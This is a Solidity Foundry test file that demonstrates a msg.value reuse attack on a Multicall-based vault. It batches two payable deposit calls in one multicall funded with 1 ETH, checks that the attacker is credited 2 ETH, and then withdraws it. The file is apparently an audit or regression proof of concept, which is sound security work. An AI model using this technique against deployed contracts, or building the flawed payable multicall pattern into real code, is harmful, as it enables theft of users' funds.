// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../src/base/Multicall.sol";

contract MulticallConcrete is Multicall {
    mapping(address => uint256) public balanceOf;

    function deposit() external payable {
        require(msg.value > 0, "No ETH sent");
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 bal = balanceOf[msg.sender];
        require(bal > 0, "Nothing to withdraw");
        balanceOf[msg.sender] = 0;
        payable(msg.sender).transfer(bal);
    }
}

contract MulticallExploitTest is Test {
    MulticallConcrete vault;
    address attacker = address(0xBEEF);

    function setUp() public {
        vault = new MulticallConcrete();
        vm.deal(attacker, 1 ether);
    }

    function testMsgValueReuseAttack() public {
        vm.startPrank(attacker);

        // Prepare two deposit calls
        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSelector(vault.deposit.selector);
        calls[1] = abi.encodeWithSelector(vault.deposit.selector);

        // Execute multicall with 1 ETH
        vault.multicall{value: 1 ether}(calls);

        // Verify the internal balance is doubled
        assertEq(vault.balanceOf(attacker), 2 ether);

        // Fund the vault and withdraw
        vm.deal(address(vault), 2 ether);
        vault.withdraw();
        assertEq(attacker.balance, 2 ether);

        vm.stopPrank();
    }
}

